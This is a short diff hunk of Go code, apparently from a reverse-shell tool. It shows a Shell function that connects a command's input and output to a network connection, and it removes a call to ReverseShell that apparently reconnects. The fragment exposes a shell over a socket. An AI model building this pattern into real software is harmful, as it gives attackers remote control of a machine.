@@ -11,5 +11,4 @@ func Shell(conn net.Conn, config Config){
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
 	cmd.Run()
 	conn.Close()
-	ReverseShell(config)
 }
